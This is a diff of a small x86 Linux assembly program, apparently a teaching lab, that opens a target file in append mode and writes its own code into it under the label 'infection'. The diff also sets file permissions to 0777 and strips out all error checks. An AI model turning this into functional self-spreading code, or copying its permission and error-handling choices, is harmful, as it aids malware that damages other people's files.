@@ -1,13 +1,13 @@
 section .data
     MSG db "Hello, Infected File", 0
     outfile dd 1
-    MSG_LEN EQU 21
+    MSG_LEN EQU 20
     STDOUT EQU 1
     WRITE EQU 4
     OPEN EQU 5
     CLOSE EQU 6
-    PERMISSIONS EQU 0644
-    O_FLAGS EQU 0x101
+    PERMISSIONS EQU 0777
+    O_FLAGS EQU 1026
 
 section .text
 global _start
@@ -53,30 +53,28 @@ system_call:
     ret                     ; Back to caller
 
 code_start:
+infection:
     push    ebp             ; Save caller state
     mov     ebp, esp
     pushad                  ; Save some more caller state
-infection:
+
+    ; Print message
     push    MSG_LEN
     push    MSG
     push    STDOUT
     push    WRITE
     call    system_call
     add     esp, 16
-infector:
-    mov     ebx, [ebp+8]    ; Get file name
 
+infector:
     ; Open file
     push    PERMISSIONS
     push    O_FLAGS
-    push    ebx
+    push    dword [ebp+8]        ; File name
     push    OPEN
     call    system_call
     add     esp, 16
     mov     dword [outfile], eax ; Update outfile
-
-    cmp     eax, 0
-    jl      infection_failed
 
     ; Write
     push    code_end - code_start
@@ -86,26 +84,13 @@ infector:
     call    system_call
     add     esp, 16
 
-    cmp     eax, 0
-    jl      infection_failed
-
     ; Close file
     push    dword[outfile]
     push    CLOSE
     call    system_call
     add     esp, 8
-    
-    cmp     eax, 0
-    jl      infection_failed
 
     popad                   ; Restore caller state (registers)
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
-
-infection_failed:
-    mov     ebx, 0x55
-    mov     eax, 1
-    call    system_call
-
 code_end:
-
